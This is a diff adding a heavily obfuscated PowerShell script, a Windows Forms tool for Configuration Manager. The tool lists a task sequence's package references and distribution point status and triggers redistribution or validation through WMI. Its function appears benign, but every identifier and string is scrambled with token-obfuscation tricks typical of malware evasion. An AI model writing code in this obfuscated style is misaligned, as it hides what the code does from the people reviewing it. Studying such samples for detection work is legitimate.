@@ -1,0 +1,286 @@
+ ${o`Qb8}  =  [TYPe]("{7}{8}{2}{6}{0}{5}{1}{3}{4}" -f'WINdo','s.fORMS.','em','apPLicATi','oN','W','.','sy','St') ;  S`eT-iT`Em  ('vARia'+'bL'+'E'+':dlE') ( [TYPE]("{1}{3}{0}{5}{2}{4}{6}" -F 'tem.rEFl','sY','CTIO','S','N.ASsEmbl','e','Y')  ) ;   ${iMdJ`yb} =  [tyPE]("{0}{6}{2}{4}{1}{3}{5}"-F'sYs','Ic','A','o','WInG.','n','TEm.Dr')  ;  pA`RaM(
+[parameter(MaNDAtoRy=${fAL`SE})]
+${s`ITe`sErvER},
+[parameter(MaNdatory=${F`Alse})]
+${TAS`KS`e`quEnCE}
+)
+
+function L`Oad-`FO`Rm {
+    ${FO`Rm}."c`ON`TrOls".("{0}{2}{1}" -f'Add','ge','Ran').Invoke(@(${dGVpa`ckAG`e`Ref}, ${d`gv`pACKag`EdP}, ${butt`OnvAlId`AtE}, ${bU`TTONR`EDIst}, ${OutP`UtB`OX}, ${gbpaC`k`Ag`Eref}, ${G`BpAc`K`AgeDP}, ${gbpAC`KaGe`OPtI`oN}, ${g`BPa`ckaG`EIn`FO}))
+    ${b`Utt`O`N`ValidaTE}."E`NaBLeD" = ${fAL`Se}
+    ${bUTTONR`e`dIST}."e`NAbled" = ${F`AL`Se}
+	${F`ORM}.("{0}{1}{2}"-f'Add_Sh','ow','n').Invoke({${fO`RM}.("{1}{0}" -f 'vate','Acti').Invoke()})
+    ${f`ORm}.("{2}{1}{0}"-f 'n','ow','Add_Sh').Invoke({geT-tSRefE`RE`N`cES})
+	[void]${fo`Rm}.("{2}{0}{1}" -f 'o','wDialog','Sh').Invoke()
+}
+
+function GET-CMsit`e`Co`de {
+    ${CmSI`TeC`o`De} = &("{2}{1}{3}{0}"-f 'ect','-Wm','Get','iObj') -Namespace ((("{1}{0}{2}"-f'tAmlSM','roo','S'))-rePlaCe  'Aml',[CHaR]92) -Class ("{1}{3}{4}{2}{0}"-f 'tion','SMS_Prov','a','ider','Loc') -ComputerName ${SiT`ese`RV`er} | &("{2}{1}{3}{4}{0}"-f'ect','O','Select-','b','j') -ExpandProperty ("{2}{0}{1}"-f'e','Code','Sit')
+    return ${CM`S`ITECOdE}
+}
+
+function geT-t`sR`EF`ERe`NcEs {
+    &("{2}{1}{3}{0}"-f'putBox','e','Writ','-Out') -OutputBoxMessage "Loading package references for task sequence: $($TaskSequence) " -Type ("{1}{0}{2}" -f 'NFO:','I',' ')
+    ${TSPa`Ck`A`GEID} = &("{2}{3}{1}{4}{0}"-f'ct','iO','Get','-Wm','bje') -Namespace "root\SMS\site_$($Global:SiteCode)" -Class ("{3}{1}{0}{2}{4}"-f 'nc','MS_TaskSeque','e','S','Package') -ComputerName ${s`i`TeserV`ER} -Filter "Name like '$($TaskSequence)' " | &("{1}{2}{0}" -f'ect-Object','S','el') -ExpandProperty ("{0}{1}"-f'Packag','eID')
+    ${t`SrEf`e`R`eNces} = &("{0}{1}{2}" -f'Get-W','miObjec','t') -Namespace "root\SMS\site_$($Global:SiteCode)" -Class ("{7}{0}{8}{6}{4}{1}{5}{3}{2}"-f 'Sequ','e','ce','n','geRef','re','Packa','SMS_Task','ence') -ComputerName ${sit`E`sERVeR} -Filter "PackageID like '$($TSPackageID)' "
+    ${TSRe`FEr`enCES`soRTed} = ${TSrE`F`erences} | &("{0}{1}{2}" -f 'Sort-','Objec','t') -Property ("{3}{1}{2}{0}" -f 'ame','je','ctN','Ob')
+    ${ts`RefErENce`S`SORt`ED} | &("{2}{0}{1}"-f 'Obj','ect','ForEach-') {
+        switch (${_}."obj`EcT`TYPe") {
+            0 { ${C`UR`R`EntPAC`KA`geTYPe} = ("{1}{0}" -f'ckage','Pa') }
+            3 { ${C`UrrENTP`A`CK`A`gEtYpE} = ("{1}{2}{0}" -f 'Package','Driver',' ') }
+            257 { ${CUrReN`Tp`A`ckAGETypE} = ("{0}{3}{1}{2}"-f 'OS','ckag','e',' Image Pa') }
+            258 { ${cUr`R`enTpA`CkagEt`Y`pE} = ("{1}{2}{0}" -f' Image','Bo','ot') }
+            259 { ${cuR`ReNTpAC`kaGe`TYpe} = ("{1}{0}{3}{2}" -f 'S In','O','age','stall Pack') }
+            512 { ${C`U`RR`ENTpa`cka`GeTYpE} = ("{0}{1}{2}" -f'App','licatio','n') }
+        }
+        ${DGvPACKAg`ER`eF}."RO`wS".("{0}{1}" -f 'A','dd').Invoke(${_}."ObJ`E`cTNAmE", ${_}."NUmbERS`Uc`cESS", ${_}."Nu`MbErIn`P`Rogre`ss", ${_}."nU`mB`EreRrO`Rs", ${_}."REFpAck`AGE`id", ${CURR`en`TP`AC`kAGETYPe})
+        ${d`G`VP`AckAge`ReF}.("{2}{1}{0}"-f'election','earS','Cl').Invoke()
+    }
+}
+
+function GET-`PA`cKAG`EdPDetAIlS {
+    param(
+    [parameter(mAnDatOry=${t`Rue})]
+    [string]${VA`Lue}
+    )
+    if (${dgVp`A`ckagE`dP}."R`oWS"."co`Unt" -ge 1) {
+        ${DG`VPAcKa`ge`dp}."r`OwS".("{0}{1}"-f 'Clea','r').Invoke()
+        ${dg`VP`ACKagedP}.("{1}{2}{0}" -f'sh','Refr','e').Invoke()
+    }
+    &("{1}{4}{3}{0}{2}" -f 'ut','Write','Box','tp','-Ou') -OutputBoxMessage "Loading Distribution Points for PackageID: $($SelectedPackageID) " -Type ("{1}{2}{0}"-f'O: ','I','NF')
+    ${d`pS} = &("{0}{1}{2}"-f'Ge','t-WmiOb','ject') -Namespace "root\SMS\site_$($Global:SiteCode)" -Class ("{5}{4}{0}{2}{1}{3}"-f 'ibu','nDPS','tio','tatus','r','SMS_Dist') -ComputerName ${si`TesE`RVer} -Filter "PackageID like '$($Value)' " | &("{4}{2}{1}{3}{0}"-f't','ect-Ob','el','jec','S') ("{2}{0}{1}" -f 'a','th','NALP'), ("{1}{0}{2}" -f 'essageStat','M','e')
+    ${D`Ps} | &("{2}{0}{1}{3}" -f'rEach-O','bj','Fo','ect') {
+        ${tri`MME`dsER`Verna`l`pATH} = (${_}."NaLP`ATh").("{0}{1}"-f'Spli','t').Invoke(']')[0]."tRI`M`staRT"(((("{0}{2}{1}"-f'[{0}','ay=','Displ')) -f[chAR]34))
+        ${C`URRE`Ntse`RveRN`A`lPatH} = ${TR`i`MmEdSErvEr`NAl`PA`TH}.("{2}{0}{1}" -f 'S','tring','Sub').Invoke(0,${tR`i`mme`DsErV`erNA`lp`AtH}."LENg`Th"-2)
+        switch (${_}."meS`SAg`es`TATE") {
+            1 { ${CuR`REN`TmE`SSA`gEsTATe} = ("{2}{1}{0}" -f 'ss','cce','Su') }
+            2 { ${CU`R`R`ENtMeSS`AGEstATe} = ("{2}{1}{3}{0}" -f 'ress','n P','I','rog') }
+            3 { ${curre`NTmESSa`gEsTa`Te} = ("{0}{1}" -f 'E','rror') }
+        }
+        ${D`G`Vp`AC`KAGEdP}."R`OWS".("{1}{0}" -f'd','Ad').Invoke(${C`U`R`Ren`TS`ervErNaLPATh}, ${CUrrENTMESSa`G`e`StATE})
+    }
+}
+
+function R`ED`IsT`Ribu`Te-pACKA`Ge {
+    param(
+    [parameter(mANdAtORy=${tR`Ue})]
+    ${p`AckA`gEID},
+    [parameter(MANdaToRy=${Tr`Ue})]
+    [ValidateSet({"{0}{2}{1}" -f 'Packa','e','g'},{"{1}{0}{2}"-f 'ver Pa','Dri','ckage'},{"{4}{0}{1}{3}{2}" -f 'Ima','ge','ackage',' P','OS '},{"{0}{1}{2}"-f 'Boot',' ','Image'},{"{1}{3}{0}{2}"-f'll Im','OS Inst','age','a'},{"{1}{0}{2}{3}" -f 'a','Applic','t','ion'})]
+    ${P`ACkAget`Y`pe},
+    [parameter(mAnDAToRY=${T`RuE})]
+    ${P`AckAge`NAmE}
+    )
+    switch (${pAck`AGET`y`PE}) {
+        ("{0}{1}" -f 'Pac','kage') { ${SMSC`La`Ss} = ("{0}{2}{1}" -f'SMS_Pac','e','kag') }
+        ("{1}{3}{2}{0}" -f'Package','Driv','r ','e') { ${s`msc`lasS} = ("{1}{3}{0}{2}"-f'g','SMS_DriverPac','e','ka') }
+        ("{4}{3}{1}{0}{2}" -f 'Pa',' Image ','ckage','S','O') { ${sMsCL`A`sS} = ("{0}{3}{2}{1}{4}" -f 'SMS_I','P','age','m','ackage') }
+        ("{2}{3}{4}{1}{0}" -f 'age',' Pack','OS',' Inst','all') { ${S`mScLAss} = ("{5}{2}{4}{1}{0}{3}" -f'emInstallPackag','yst','ng','e','S','SMS_Operati') }
+        ("{0}{1}{2}" -f'B','oot I','mage') { ${S`m`sCLaSs} = ("{2}{0}{5}{6}{4}{1}{3}" -f 'MS_Bo','P','S','ackage','mage','ot','I') }
+    }
+    try {
+        ${w`mIOb`je`cT} = &("{3}{1}{0}{2}" -f'b','WmiO','ject','Get-') -Namespace "root\SMS\site_$($Global:SiteCode)" -Class ${S`M`sclasS} -ComputerName ${S`itES`ER`VER} -Filter "PackageID = '$($PackageID)' "
+        ${wMiOb`J`E`cT}.("{4}{1}{3}{0}{2}"-f'kgSourc','esh','e','P','Refr').Invoke()
+        &("{1}{3}{2}{0}" -f'Box','Writ','Output','e-') -OutputBoxMessage "Successfully started to redistribute $($PackageType.ToLower()): '$($PackageName)' " -Type ("{0}{1}"-f'INFO:',' ')
+    }
+    catch {
+        &("{2}{0}{1}"-f 'Outp','utBox','Write-') -OutputBoxMessage "$($_.Exception.Message)" -Type ("{0}{1}{2}" -f'E','RR','OR: ')
+    }
+}
+
+function VALID`ATe-`p`ACKa`ge {
+    param(
+    [parameter(mANdATorY=${Tr`UE})]
+    ${Pa`cKAGE`iD},
+    [parameter(mANDATOrY=${T`RUe})]
+    [ValidateSet({"{1}{0}{2}" -f 'kag','Pac','e'},{"{2}{4}{1}{0}{3}"-f ' Pac','ver','Dr','kage','i'},{"{1}{4}{0}{3}{2}"-f 'Image ','OS','age','Pack',' '},{"{0}{1}{2}"-f 'B','oot I','mage'},{"{0}{3}{4}{2}{1}" -f 'O','Image','l ','S In','stal'},{"{1}{0}{2}" -f'licat','App','ion'})]
+    ${p`ACKaGeT`y`pe},
+    [parameter(MAndatoRY=${Tr`Ue})]
+    ${p`ACK`AGE`NAMe}
+    )
+    switch (${pa`CK`AGet`yPe}) {
+        ("{1}{0}{2}" -f 'k','Pac','age') { ${s`mS`ClasS} = ("{1}{2}{3}{0}"-f 'e','S','MS_Packa','g') }
+        ("{2}{0}{3}{1}"-f'a','kage','Driver P','c') { ${S`MSCLA`ss} = ("{3}{1}{0}{2}"-f'erP','S_Driv','ackage','SM') }
+        ("{0}{3}{1}{2}"-f 'OS Im',' Pac','kage','age') { ${sM`SC`LAss} = ("{1}{0}{3}{2}{4}" -f 'ge','SMS_Ima','cka','Pa','ge') }
+        ("{0}{2}{3}{1}"-f 'OS I','kage','nstall Pa','c') { ${smSCla`SS} = ("{3}{5}{7}{6}{4}{2}{0}{1}"-f 'ka','ge','allPac','SMS_Ope','t','ra','s','tingSystemIn') }
+        ("{0}{2}{1}" -f'Boot','ge',' Ima') { ${S`mS`cLASS} = ("{1}{2}{0}{3}{4}"-f 'S_Boo','S','M','tImagePac','kage') }
+    }
+    try {
+        ${dppa`C`K`A`geNAls} = (&("{2}{3}{1}{0}" -f 'ect','-WmiObj','Ge','t') -Namespace "root\SMS\site_$($Global:SiteCode)" -Class ("{0}{4}{1}{3}{2}"-f'SMS_Dis','i','Point','on','tribut') -ComputerName ${siT`EsE`RV`Er} -Filter "PackageID = '$($PackageID)' ")."sE`RveRNa`LpAth"
+        ${DPp`ACKagE`NaLs} | &("{2}{0}{3}{1}{4}"-f 'E','h-Objec','For','ac','t') {
+            ${dp`NAME} = (${_}).("{0}{1}"-f 'Spl','it').Invoke(']')[0]."tRiMst`A`RT"(((("{3}{2}{1}{0}" -f '=','lay','9KDisp','[X'))."REp`LaCe"(([cHAr]88+[cHAr]57+[cHAr]75),[sTRING][cHAr]34)))
+            ${vALiDat`E`eXec`UTIOn} = &("{1}{4}{0}{3}{2}" -f'-Wm','Invo','od','iMeth','ke') -Namespace "root\SMS\site_$($Global:SiteCode)" -Class ("{4}{3}{1}{5}{2}{6}{0}"-f'oint','r','ion','S_Dist','SM','ibut','P') -Name ("{2}{1}{3}{0}" -f'e','ka','VerifyPac','g') -ArgumentList (${_}, ("{0}{2}{1}"-f'CA','C','S0000')) -ComputerName ${siteser`V`er}
+            if (${v`ALI`d`ATE`ExeC`UTioN}."rEtUrNVa`L`UE" -eq 0) {
+                &("{2}{1}{0}{3}"-f'putBo','e-Out','Writ','x') -OutputBoxMessage "Successfully started validating '$($PackageName)' on DP: $($DPName) " -Type ("{2}{0}{1}" -f 'NFO:',' ','I')
+            }
+        }
+    }
+    catch {
+        &("{1}{3}{0}{2}"-f'-Outpu','Writ','tBox','e') -OutputBoxMessage "$($_.Exception.Message)" -Type ("{1}{2}{0}" -f ': ','ERR','OR')
+    }
+}
+
+function Wr`Ite-o`U`TputB`OX {
+	param(
+	[parameter(MaNDATOry=${t`Rue})]
+	[string]${out`p`U`TBOxm`eSsAgE},
+	[ValidateSet({"{3}{2}{0}{1}" -f 'G',': ','ARNIN','W'},{"{2}{1}{0}"-f' ',':','ERROR'},{"{1}{2}{0}"-f ': ','I','NFO'})]
+	[string]${ty`Pe}
+	)
+	Process {
+		if (${O`UtpuT`BOx}."Te`XT"."l`EN`gTh" -eq 0) {
+			${Ou`TP`U`TboX}."Te`xt" = "$($Type)$($OutputBoxMessage)"
+			  ( &("{0}{1}"-f 'I','tEm') ("{0}{1}{2}"-f'VaRIAbL','e:Oq','B8')  )."V`ALue"::("{0}{1}"-f'D','oEvents').Invoke()
+            ${OUtPU`TB`Ox}.("{1}{0}{2}{3}"-f'c','S','ro','llToCaret').Invoke()
+		}
+		else {
+			${oUT`p`Utb`ox}.("{0}{2}{1}"-f 'Ap','xt','pendTe').Invoke("`n$($Type)$($OutputBoxMessage)")
+			  (&('gi')  ("{0}{2}{1}{3}" -f'vArIAble','B',':OQ','8'))."V`ALue"::("{1}{2}{0}"-f'ts','DoEv','en').Invoke()
+            ${ou`TpuTb`Ox}.("{3}{0}{2}{1}" -f 'T','t','oCare','Scroll').Invoke()
+		}
+	}
+}
+
+
+${glO`Bal:si`T`ECOdE} = &("{2}{0}{1}{3}"-f'et-CMS','ite','G','Code')
+
+
+[void] (  &("{1}{0}" -f'm','gEt-ItE')  ("VaR"+"IABle:"+"Dl"+"e") )."VAL`Ue"::("{2}{1}{4}{3}{0}"-f 'lName','P','LoadWith','a','arti').Invoke(("{0}{2}{1}" -f'Syst','awing','em.Dr')) 
+[void] (&("{2}{0}{1}"-f'Aria','BLe','GeT-V') ('dl'+'e')  )."v`AlUe"::("{1}{2}{3}{0}"-f 'ialName','Loa','dWithPar','t').Invoke(("{2}{1}{3}{0}" -f 'ms','m.Window','Syste','s.For')) 
+
+
+${Fo`RM} = &("{3}{1}{0}{2}"-f 'ec','ew-Obj','t','N') ("{6}{7}{0}{3}{5}{1}{4}{2}" -f'.W','ws.Forms.F','m','i','or','ndo','Syste','m')    
+${F`ORM}."S`IZe" = &("{0}{2}{1}{3}" -f 'N','-Obje','ew','ct') ("{4}{0}{2}{3}{5}{1}" -f'ys','ize','te','m.Dra','S','wing.S')(950,815)  
+${fO`Rm}."m`INI`MUMsIzE" = &("{2}{0}{1}"-f'bj','ect','New-O') ("{0}{3}{2}{1}{4}"-f 'Sy','awing.S','em.Dr','st','ize')(950,815)
+${f`oRm}."i`CON" =   (&("{0}{1}" -f'I','teM') ("{0}{1}{4}{3}{2}" -f 'Va','r','B','BLE:iMdJy','Ia')  )."Val`Ue"::("{2}{5}{1}{3}{0}{4}"-f 'ssociate','ract','E','A','dIcon','xt').Invoke((${e`N`V:sm`s_aDM`iN`_UI_P`Ath}).("{3}{2}{0}{1}" -f 'r','ing','St','Sub').Invoke(0,${ENv:`Sm`s_`A`DMI`N`_UI_Path}."L`eNg`Th"-5) + ((("{1}{2}{0}{4}{3}"-f 'osoft.C','{0}Mic','r','tionManagement.exe','onfigura'))-F[chAR]92))
+${fO`Rm}."Te`xt" = ("{7}{2}{3}{8}{5}{6}{4}{0}{1}" -f'1.','0','sk Sequence',' R','ool ','rence','s T','Ta','efe')
+${F`oRM}."C`ON`T`RolBOX" = ${TR`Ue}
+${fo`RM}."tOp`m`oSt" = ${Tr`Ue}
+
+
+${oUt`P`UTBoX} = &("{0}{1}{2}"-f'New-Obje','c','t') ("{6}{2}{8}{3}{0}{4}{1}{5}{7}"-f 'w','t','e','.Windo','s.Forms.RichTex','B','Syst','ox','m') 
+${OuT`Pu`TBoX}."LoCAT`i`oN" = &("{1}{2}{0}" -f'Object','New','-') ("{4}{5}{0}{1}{3}{2}" -f'te','m.Dr','g.Size','awin','S','ys')(20,590) 
+${ou`Tput`BOX}."Si`Ze" = &("{0}{3}{1}{2}" -f 'Ne','-Obj','ect','w') ("{3}{4}{5}{2}{6}{0}{1}" -f'ng','.Size','m.Draw','Sy','st','e','i')(750,150)
+${oU`TPutb`ox}."aNCh`or" = ("{2}{3}{0}{1}"-f't, ','Right','Bottom',', Lef')
+${oUt`p`UTbox}."F`OnT" = ("{3}{1}{0}{2}" -f'r','e',' New','Couri')
+${OUtpU`Tb`Ox}."BACKC`O`loR" = ("{1}{0}"-f'hite','w')
+${O`UTp`UTbOx}."REAd`o`NLy" = ${T`Rue}
+${oUt`PU`TB`OX}."M`UltIli`NE" = ${T`RuE}
+
+
+${b`Utt`onVALi`d`ATE} = &("{2}{0}{1}" -f'w-Ob','ject','Ne') ("{3}{1}{2}{0}{4}{5}" -f 'ws.Fo','te','m.Windo','Sys','rm','s.Button')
+${bu`TtONVali`Da`TE}."lO`cat`ion" = &("{1}{0}{2}"-f'bje','New-O','ct') ("{0}{1}{2}{3}{4}" -f'System.','Drawi','ng.','Siz','e')(800,30)
+${ButT`ON`ValiDAtE}."Si`Ze" = &("{3}{0}{2}{1}"-f'Obje','t','c','New-') ("{2}{3}{0}{1}" -f 'g.Siz','e','System.Draw','in')(110,30)
+${bu`T`T`oN`ValidATE}."te`XT" = ("{1}{2}{0}"-f'idate','Va','l')
+${BUTton`VALID`AtE}."an`c`HOr" = ("{3}{1}{2}{0}" -f 'm','t, ','Top, Botto','Righ')
+${bUtt`onva`LidaTE}.("{2}{1}{3}{0}"-f 'anged','d','Ad','_SizeCh').Invoke({${BUT`To`NVA`lID`AtE}."s`IZe" = &("{1}{0}{2}{3}"-f 'w-Obj','Ne','e','ct') ("{2}{0}{1}{3}"-f'ing.S','i','System.Draw','ze')(110,30)})
+${BUT`T`Onva`lid`AtE}.("{3}{0}{1}{2}" -f 'd','d_','MouseClick','A').Invoke({
+    ${SelEc`TE`dPacKag`eIDv`A`LiDaTE} = ${dG`V`PaCKAGER`ef}."RO`Ws"[${D`gVPack`A`gErEf}."Se`l`eCteDceLLS"[0]."R`owI`NdEx"]."Ce`lls"[4]."VaL`Ue"
+    ${S`eLecT`eD`PaCkaGe`T`YPeVA`LIdaTE} = ${Dg`VpaC`KAge`REf}."Ro`ws"[${d`GvPa`ckAGeR`ef}."SE`LECteDC`ElLs"[0]."rowi`NDeX"]."CE`Lls"[5]."Va`LUE"
+    ${S`elE`cTe`d`packAgEnaM`EV`ALIdA`Te} = ${Dg`VpA`c`kaGeReF}."R`oWs"[${D`GVPa`CKAgeRef}."sELeCt`edcEL`LS"[0]."r`o`wINdEx"]."cel`lS"[0]."vA`lue"
+    &("{3}{2}{1}{0}"-f 'age','Pack','alidate-','V') -PackageID ${s`EL`ecTedpACKA`GEi`DValIDaTe} -PackageType "$($SelectedPackageTypeValidate)" -PackageName "$($SelectedPackageNameValidate)"
+})
+${bUT`Tonr`e`dist} = &("{1}{2}{3}{0}"-f 'ct','N','ew-O','bje') ("{4}{0}{5}{6}{2}{3}{1}" -f'ste','ms.Button','F','or','Sy','m','.Windows.')
+${bU`T`TONREDisT}."LoC`A`TIoN" = &("{2}{0}{1}" -f 'Obj','ect','New-') ("{0}{1}{3}{2}{4}"-f'S','yst','.Drawing.S','em','ize')(800,70)
+${b`UTTOnr`EdI`ST}."S`Ize" = &("{1}{3}{2}{0}" -f 't','New','jec','-Ob') ("{0}{3}{2}{1}"-f 'Sys','.Size','em.Drawing','t')(110,30)
+${bUTtonrE`dI`St}."Te`xT" = ("{1}{3}{0}{2}"-f 'ib','Redi','ute','str')
+${buTTon`Re`DI`ST}."aN`c`hOr" = ("{3}{1}{5}{2}{0}{4}"-f ' B','ht',' Top,','Rig','ottom',',')
+${bu`TT`oNReDisT}.("{0}{2}{1}" -f'A','SizeChanged','dd_').Invoke({${B`UTTo`NrE`DISt}."s`IZe" = &("{3}{2}{1}{0}"-f 't','c','e','New-Obj') ("{0}{3}{1}{4}{2}"-f'Sy','g.S','e','stem.Drawin','iz')(110,30)})
+${ButTO`Nr`eD`ist}.("{3}{2}{0}{4}{1}"-f'Mou','ick','d_','Ad','seCl').Invoke({
+    ${SeLec`TeDPA`CK`A`G`E`id`ReDIST} = ${Dg`V`P`ACkAGeref}."r`ows"[${D`Gv`pac`Kageref}."S`ELectEDc`e`lls"[0]."Ro`wINDeX"]."cEl`Ls"[4]."v`AlUE"
+    ${seL`eCtedpA`c`KAgETY`perE`dIst} = ${D`GvpA`Ck`AgEreF}."ro`WS"[${D`gV`P`AcKaGeReF}."Se`L`ECTedCELlS"[0]."r`OwiND`Ex"]."cEl`lS"[5]."va`LUE"
+    ${SE`lecTedP`A`Ckagen`A`M`eR`eDi`St} = ${DgV`P`AcKA`gEr`ef}."Ro`WS"[${DgvPa`CkaGER`ef}."SELecT`E`dC`EL`Ls"[0]."RoW`i`Ndex"]."c`elLs"[0]."V`AlUE"
+    &("{3}{2}{1}{0}"-f 'ckage','ibute-Pa','r','Redist') -PackageID ${Se`lecTeDp`ACK`Age`idrEdiST} -PackageType "$($SelectedPackageTypeRedist)" -PackageName "$($SelectedPackageNameRedist)"
+})
+
+
+${D`gVPaC`kagE`REF} = &("{2}{1}{0}"-f 'Object','-','New') ("{3}{4}{6}{5}{0}{1}{2}" -f's.','Forms.','DataGridView','S','yste','ow','m.Wind')
+${dgvp`ACkAGe`REF}."LOC`At`ioN" = &("{1}{0}{2}" -f'c','New-Obje','t') ("{2}{1}{3}{0}"-f'.Size','in','System.Draw','g')(20,30)
+${dgvp`A`ckA`gEREf}."s`izE" = &("{2}{1}{0}" -f 'ject','Ob','New-') ("{4}{0}{2}{5}{3}{1}"-f'D','.Size','ra','g','System.','win')(750,270)
+${dgV`PACK`AgereF}."A`NCh`or" = ("{1}{3}{6}{5}{4}{0}{2}"-f'Rig','Top','ht',',','t, ','ttom, Lef',' Bo')
+${Dg`VPAc`K`AG`eREF}."Col`UMNCO`U`Nt" = 6
+${dgvPACkAGE`R`Ef}."COluM`NHeaDE`Rsvi`S`ib`LE" = ${t`Rue}
+${dg`VpAc`Ka`gEREf}."cO`LU`mNS"[0]."N`Ame" = ("{0}{1}" -f 'Pa','ckage')
+${Dg`VP`A`c`kAGeref}."COl`Umns"[0]."au`ToSiZEMO`dE" = ("{0}{1}" -f'Fil','l')
+${dg`V`PAc`ka`geREF}."cO`Lum`Ns"[1]."N`AmE" = ("{1}{0}"-f 'cess','Suc')
+${D`gVpackAg`e`R`ef}."CO`LumnS"[1]."w`idTH" = 60
+${dG`V`pACKAG`EREf}."col`U`Mns"[2]."NA`ME" = ("{2}{0}{3}{1}" -f 'n Progr','ss','I','e')
+${Dg`V`paC`Ka`GErEf}."cOlU`m`NS"[2]."wi`dth" = 70
+${DGv`p`AcKAGERef}."coLu`m`NS"[3]."N`AMe" = ("{2}{1}{0}" -f'd','le','Fai')
+${dg`V`pacKAgeR`ef}."cOL`U`MnS"[3]."w`idth" = 60
+${dgVp`ACka`GERef}."ColU`mNS"[4]."Na`mE" = ("{0}{1}{2}"-f'Packag','e I','D')
+${D`G`Vp`Ack`AGereF}."C`oLUMNs"[4]."W`IDTH" = 70
+${dgvPaCkA`G`E`Ref}."C`O`LuMnS"[5]."n`AMe" = ("{0}{1}{3}{2}"-f 'Packa','g','pe','e Ty')
+${D`g`Vpac`kAgeR`eF}."C`OLUm`Ns"[5]."wI`dTh" = 110
+${dGv`PAckag`EreF}."a`LLO`wUsE`RTo`ADDroWS" = ${fa`l`SE}
+${DgvPA`ck`A`Ger`EF}."AllO`WuS`ERtOdE`Le`Te`RoWS" = ${fAL`Se}
+${dG`Vp`AckaG`Eref}."r`EAdON`ly" = ${T`RuE}
+${dG`VPa`CKAger`ef}."mUlTiSE`l`ecT" = ${FaL`sE}
+${Dg`VPAC`k`AG`EReF}."c`oLuMn`HEADe`Rs`H`eiG`htSIzemode" = ("{2}{0}{1}{3}" -f'leR','esi','Disab','zing')
+${DgVPACk`Age`REf}."r`OWH`eaDe`RswIDtHS`I`zem`oDE" = ("{0}{1}{2}{3}"-f 'Disabl','e','Resizin','g')
+${dgV`pAc`kA`gERef}."ro`W`he`Aders`VisiBLE" = ${f`AlsE}
+${d`gVPa`CkAGer`EF}.("{1}{2}{4}{0}{5}{3}" -f 'nte','Ad','d_C','ick','ellCo','ntCl').Invoke({
+    if (${dgV`Pack`A`gEREF}."CURrentcel`LAdD`R`E`sS"."x" -eq 0) {
+        if (${dGVp`ACK`A`gErEf}."r`OWS"[${Dg`Vp`AC`kage`Ref}."S`EL`eC`TedCEllS"[0]."ROwI`ND`EX"]."C`elLS"[5]."v`ALuE" -like ("{2}{0}{1}{3}" -f'pplic','atio','A','n')) {
+            ${bu`TTOnv`ALI`DaTE}."EnAB`L`eD" = ${fAL`SE}
+            ${bUTToN`Re`DI`ST}."e`NaB`led" = ${F`A`LSe}
+        }
+        else {
+            ${butt`oNVA`L`IDATE}."e`NabL`ed" = ${t`RUe}
+            ${b`UtT`onr`Ed`ISt}."eNabl`eD" = ${tr`Ue}
+        }
+        ${Select`eDpA`ckA`ge`ID} = ${dg`V`P`AckAgE`REF}."r`oWs"[${DGv`Pa`CkagE`REF}."S`e`lEcteDC`ELLS"[0]."Ro`WiNDEx"]."cEL`ls"[4]."VAl`Ue"
+        ${GBp`AC`KagEDp}."te`XT" = "Distribution Status for selected package: $($DGVPackageRef.Rows[$DGVPackageRef.SelectedCells[0].RowIndex].Cells[0].Value) "
+        &("{1}{3}{2}{0}"-f 'ils','Get','a','-PackageDPDet') -Value ${SEle`Cted`pAcka`Ge`id}
+    }
+})
+${D`gV`PAC`Ka`GEDp} = &("{1}{0}{2}"-f 'bjec','New-O','t') ("{8}{3}{5}{0}{7}{6}{2}{4}{1}" -f 'd','ew','.D','m.','ataGridVi','Win','Forms','ows.','Syste')
+${DgvpA`CKA`g`e`dp}."LO`cATI`on" = &("{2}{1}{0}"-f 't','ew-Objec','N') ("{5}{1}{3}{0}{4}{2}"-f'm.D','yst','ze','e','rawing.Si','S')(20,335)
+${D`g`Vp`AcKAGeDP}."si`zE" = &("{2}{0}{1}{3}"-f'b','j','New-O','ect') ("{1}{4}{0}{3}{2}"-f 'Drawing','Sy','ze','.Si','stem.')(750,220)
+${dgvp`A`C`kAgEDP}."an`cH`OR" = ("{2}{1}{3}{0}" -f'ight','ottom, Le','B','ft, R')
+${DGvPaC`k`Age`dP}."cO`LuMn`C`ouNt" = 2
+${d`gV`PaCKaG`Edp}."cOL`Um`NHEADeR`s`VIsiBLE" = ${t`Rue}
+${DGvP`A`CK`AGEDP}."Co`LuM`Ns"[0]."n`AMe" = ("{0}{2}{5}{1}{4}{3}" -f'Dis','ution ','tr','nt','Poi','ib')
+${dG`V`pACkAg`edp}."CoLum`NS"[0]."AuT`OsIZ`eMoDe" = ("{1}{0}" -f'ill','F')
+${dG`VP`ACk`A`GedP}."C`oLU`MNS"[1]."Na`Me" = ("{0}{1}{3}{2}{4}{5}" -f 'Dis','tr','uti','ib','on S','tatus')
+${dg`Vp`ACKaG`e`Dp}."cOLuM`NS"[1]."wID`Th" = 100
+${DgVP`ACK`AGe`dP}."aL`lOWU`SerTO`AddRO`WS" = ${F`AL`sE}
+${Dg`Vpack`A`gE`dp}."allo`w`USe`RToD`ELeTErO`Ws" = ${f`Al`SE}
+${dg`V`pacKa`GE`dp}."REA`d`oNly" = ${T`RUe}
+${d`gV`pAC`kAgedp}."m`ULtIsEl`e`Ct" = ${f`AlSe}
+${d`gVpACKA`gEdp}."C`olU`M`NHeA`dERSHei`gHTsiZ`eMo`De" = ("{2}{1}{0}" -f'sizing','ableRe','Dis')
+${d`gv`pa`cKAgEdP}."rOwh`ea`D`eRSwiDTHsiZ`EmoDE" = ("{3}{2}{1}{0}"-f 'ing','Resiz','e','Disabl')
+${DGVp`A`C`Ka`gEDp}."ro`wh`e`A`DErsvIS`iBLe" = ${F`ALSe}
+${D`Gv`PacKa`G`edp}.("{1}{3}{6}{5}{0}{2}{4}"-f'n','A','Chang','dd','ed','o','_Selecti').Invoke({
+    ${dG`VP`Ac`k`AGedp}.("{3}{2}{0}{1}" -f 'arSelectio','n','le','C').Invoke()
+})
+
+
+${gbPA`cKAGer`eF} = &("{1}{0}{2}" -f'ec','New-Obj','t') ("{7}{3}{4}{6}{2}{5}{1}{8}{0}"-f'roupBox','or','ow','W','i','s.F','nd','System.','ms.G')
+${gB`pAC`KAGEReF}."Lo`caTI`ON" = &("{1}{2}{0}"-f 'w-Object','N','e') ("{1}{4}{0}{2}{3}" -f 'i','Sy','ng.','Size','stem.Draw')(10,10) 
+${GbPa`cK`A`gE`Ref}."s`izE" = &("{1}{0}{2}" -f'ec','New-Obj','t') ("{3}{4}{0}{2}{1}"-f'em','wing.Size','.Dra','Sy','st')(770,300)
